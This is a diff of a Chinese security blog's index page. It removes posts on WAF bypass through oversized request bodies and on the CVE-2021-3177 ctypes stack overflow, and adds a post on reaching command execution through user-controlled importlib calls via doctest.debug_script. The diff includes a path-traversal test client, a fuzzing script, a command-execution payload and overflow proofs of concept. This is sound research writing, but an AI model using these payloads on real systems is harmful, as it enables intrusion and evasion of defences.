@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,134 +159,6 @@
 
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（三）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到 “post请求体过大时会绕过某些waf”。</p>
-<p>刚好今天看到一个用此方法绕过的案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p>
-<p>这个绕过姿势记得在2017年就有人分享过，因为我对”因为性能原因所以导致waf放行”这个解释有点疑问，所以研究了一下。</p>
-<p>本文主要研究:</p>
-<ul>
-<li>为什么请求体过大时会绕过waf的防护？</li>
-<li>什么场景下可以使用这种绕过姿势攻击到后端服务？</li>
-<li>怎么测试？</li>
-</ul>
-<p>以下研究的waf都是基于openresty实现的。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>openresty怎么读请求体？</p>
-<p><a target="_blank" rel="noopener" href="https://moonbingbing.gitbooks.io/openresty-best-practices/content/openresty/get_req_body.html">获取请求 body</a> 的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line">local data &#x3D; ngx.req.get_body_data()</span><br><span class="line">-- local file_name &#x3D; ngx.req.get_body_file()</span><br></pre></td></tr></table></figure>
-
-<p>根据 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module#ngxreqread_body">openresty文档</a> 得知</p>
-<blockquote>
-<p>如果请求体存放到了临时文件，就应该调用 <code>ngx.req.get_body_file</code> 接口来获取临时文件名。</p>
-<p>如果请求体存放到内存中，就应该调用 <code>ngx.req.get_body_data</code> 接口来获取请求体。</p>
-</blockquote>
-<p><em>什么时候请求体会存放到临时文件呢？</em></p>
-<p> 有两个配置选项决定nginx是否会把请求体放到临时文件:</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client_body_buffer_size</a>:如果请求体大小超过此值，就会把整个请求体或者请求体的一部分写到一个临时文件。</p>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_in_file_only">client_body_in_file_only</a>:此选项直接决定nginx是否将请求体放到文件中。</p>
-</blockquote>
-</li>
-<li><p>为什么请求体过大时会绕过waf的防护？</p>
-<p>请求体过大，超过 client_body_buffer_size 配置的值时，请求体会写到临时文件。</p>
-<p>而很多waf不处理临时文件。相当于拿到的请求体会为空。比如曾经很火的 <a target="_blank" rel="noopener" href="https://github.com/loveshell/ngx_lua_waf/blob/master/waf.lua">ngx_lua_waf</a> 就没有临时文件相关操作。</p>
-<p><em>那为啥waf作者没有处理临时文件呢？</em></p>
-<p>可能是忘了，也可能觉得损耗性能。这里的性能我理解主要是与 io、内存有关。</p>
-<p>在openresty中读文件可以有两个api：</p>
-<blockquote>
-<p> ngx_io.open，此api是非阻塞的</p>
-<p> io.open，此api是阻塞的</p>
-</blockquote>
-<p>如果使用<code>io.open</code>读”临时文件”，整个nginx worker就会卡在这个读文件步骤中，肯定会导致整个集群能服务的最大并发数变低。</p>
-<p>如果使用<code>lua-io-nginx-module</code>模块的<code>ngx_io.open</code>非阻塞api来代替<code>io.open</code>阻塞api来读文件，虽然不会阻塞整个nginx worker，但”读文件io操作”还是要和磁盘打交道，需要中断和多次内存拷贝，还是有性能损耗。</p>
-<p>并且，如果服务是将文件一次性读取到内存中时，那”不怀好意”的人多搞几个这样”post请求体过大”的请求，就有可能导致机器内存耗尽。</p>
-</li>
-<li><p>什么场景下可以使用这种绕过姿势？</p>
-<p>即使waf放行了，也需要后端支持这种超大的请求体。而不少服务对请求体大小是有限制的。</p>
-<p>比如nginx的<a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client_max_body_size</a>:如果请求体大小超过此设置值，就会返回 413 (Request Entity Too Large)  错误。 此配置为0表示不限制请求体大小。</p>
-<p>再比如php的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ini.core.php#ini.post-max-size">post-max-size</a>:如果请求体大小超过此设置值，<code>$_POST</code>和<code>$_FILES</code>会为空。</p>
-<p><em>所以满足以下条件时，应该可以利用成功</em>:</p>
-<blockquote>
-<p>请求体大小超过waf client_body_buffer_size配置限制，且waf没有处理临时文件</p>
-<p>请求体大小未超过后端服务的大小限制</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="怎么测试"><a href="#怎么测试" class="headerlink" title="怎么测试"></a>怎么测试</h1><p>客户端的测试代码如下，需要看情况调整big_str的大小</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host &#x3D; &quot;a.baidu.com&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:9998&#x2F;a.php&quot;</span><br><span class="line">payload &#x3D; &quot;..&#x2F;..&#x2F;..&#x2F;&quot;</span><br><span class="line">big_str &#x3D; &quot;A&quot;*1024*1024*200  # 200M</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: host, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;</span><br><span class="line">data &#x3D; &quot;a&#x3D;%s&amp;b&#x3D;%s&quot; % (big_str, payload)</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line">print(res.content.decode(&quot;utf8&quot;))</span><br><span class="line">print(res.status_code)</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文并没有研究waf厂商是怎么解决这个问题的，比如pdf提到的stream模式是怎么实现的、stream模式是否可以绕过。</p>
-<p>绕过waf防护的原因是请求体过大时会被存放到”临时文件”中，而不处理”临时文件”是出于io、内存等性能考虑。</p>
-<p>这种绕过姿势还需要”请求体大小未超过后端服务的大小限制”才能利用成功。</p>
-<p>另外 “post请求过大为什么会绕过waf”还有两个可能的原因：</p>
-<blockquote>
-<ul>
-<li>payload刚好被”tcp分片”</li>
-<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则回溯次数超过限制</a></li>
-</ul>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -466,6 +338,90 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
+<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+
+<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
+<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
+<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
+<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
+<p>结果测出很多函数都可以正常运行，没有报错。</p>
+<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
+<p>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+
+<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
+<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -538,126 +494,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Python栈溢出CVE-2021-3177分析</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我正在学习缓冲区溢出，同时又对各个语言的安全问题感兴趣。最近看到 <a target="_blank" rel="noopener" href="https://bugs.python.org/issue42938">Python CVE-2021-3177</a> ，所以分析一下。</p>
-<p>从描述上看，这是一个sprintf函数引发的栈溢出漏洞。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>因为本文主要分析的和Python执行流程关系不大，所以也可以忽略第一步调试环境搭建，直接看调试分析。</p>
-<ol>
-<li><p>搭建调试环境</p>
-<p> 我用的IDE是Clion</p>
-<p> 先搭建Python调试环境，编译出可调试的Python二进制程序。这一步可以参考官网 <a target="_blank" rel="noopener" href="https://devguide.python.org/">Guide</a></p>
-<p> 准备好漏洞测试的Python代码</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">x &#x3D; c_double.from_param(1e300)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>调试分析</p>
-<p> 在<code>_ctypes/callproc.c</code>下面代码打好断点</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p> 在IDE中可以看到 self-&gt;value.d 是double类型，且值就是我们传入的参数。</p>
-<p> 从这里可以看出来，这个CVE漏洞和下面这段C代码漏洞是一样的</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;1e300;  &#x2F;&#x2F;s值用户可控</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 所以接下来我就去研究学习上面的C代码中漏洞是怎么利用的。</p>
-</li>
-<li><p>sprintf引起的栈溢出分析</p>
-<p> <a target="_blank" rel="noopener" href="https://book.51cto.com/art/201311/419419.htm">网上文章</a>分析sprintf溢出都以<code>sprintf(buf, &quot;%s&quot;, s);</code>举例</p>
-<p> 对于 “%s” 格式符这种覆盖很容易理解，如果s=”a…a” 很多a字符时，就可以将rip覆盖成”\x6161616161616161”。</p>
-<p> 对于 “%f” 这种用浮点数字去覆盖buf变量，我就有一个疑问，浮点数怎么控制rip指针。比如s=11111111111111112222222233333333.0时，rip会被覆盖成什么？</p>
-<p> 先说自己的结论：</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在漏洞代码中，double浮点数可以用来向很大内存中写入 &#96;\x30-\x39&#96;、&#96;\x2e&#96; 的字节。</span><br><span class="line"></span><br><span class="line">* 只能写入&#96;\x30-\x39&#96;、&#96;\x2e&#96;，而不能写其他字节，是因为 %f 转换成小数只能有&#96;[0-9.]&#96;，数字1-9对应的十六进制就是 &#96;\x30&#96;-&#96;\x39&#96;</span><br><span class="line">* 能覆盖多大的内存？</span><br><span class="line">    * 因为double类型，表示的小数位数能很大，所以至少可以覆盖300个字节</span><br><span class="line">    * 如果是float类型，就要小的多了</span><br></pre></td></tr></table></figure>
-
-<p> 结论是怎么来的呢？</p>
-<p> 首先我们要知道浮点数在计算机并不总是能够精确的被表示，只能被近似表示。更具体的细节需要去了解”浮点数在计算机中的存储”，可以看文末的参考资料。</p>
-<p> 所以 <code>double s=11111111111111112222222233333333.0</code> 在内存中，s的值并不一定是 <code>11111111111111112222222233333333.0</code></p>
-<p> 我在代码中加了一行<code>printf(&quot;%f\n&quot;,s);</code>打印s变量实际的值。</p>
-<p> 从下面的分析来看，在64位系统上 11111111111111112222222233333333.0 会把rip覆盖成”\x30\x38\x30\x32\x34\x33\x35\x33”。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;11111111111111112222222233333333.0; &#x2F;&#x2F;16个1，8个2，8个3</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; s实际的值是 1111111111111111 19575513 35342080.000000</span><br><span class="line">  &#x2F;&#x2F;            buf栈            rbp      rip</span><br><span class="line">  printf(&quot;%f\n&quot;,s);</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line"></span><br><span class="line">  print(&quot;&quot;.join([hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]))</span><br><span class="line">  &quot;35342080&quot;字符串对应 \x33\x35\x33\x34\x32\x30\x38\x30</span><br><span class="line"></span><br><span class="line">  &gt;&gt;&gt; x&#x3D;[hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]</span><br><span class="line">  &gt;&gt;&gt; x.reverse()</span><br><span class="line">  &gt;&gt;&gt; print(&quot;&quot;.join(x))</span><br><span class="line">  \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line"></span><br><span class="line">  *&#x2F;</span><br><span class="line">  &#x2F;&#x2F; 所以rip会被覆盖成 \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line">  &#x2F;&#x2F; gdb验证后，符合预期</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>_ctypes/callproc.c</code>其他代码有没有相同的栈溢出问题？<br> self-&gt;value.d在_ctypes/ctypes.h文件有定义，是一个union数据类型。</p>
-<p> 这个union类型中看着好像还有几个字段也能用在sprintf栈溢出中，如下：</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    char c;</span><br><span class="line">    char b;</span><br><span class="line">    short h;</span><br><span class="line">    int i;</span><br><span class="line">    long l;</span><br><span class="line">    long long q;</span><br><span class="line">    long double D; &#x2F;&#x2F; 可以利用</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 可能可以</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
-
-<p> 在 _ctypes/callproc.c 文件看了看，结论是只有d变量可以利用。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    ...</span><br><span class="line">    long double D; &#x2F;&#x2F; 没有用到这个变量</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 因为只用到了 %p 打印地址，没有 %s ，所以也无法利用</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
-
-<p> _ctypes/callproc.c文件中，也只有下面的代码sprintf d变量。所以只有这一处是存在栈溢出的。</p>
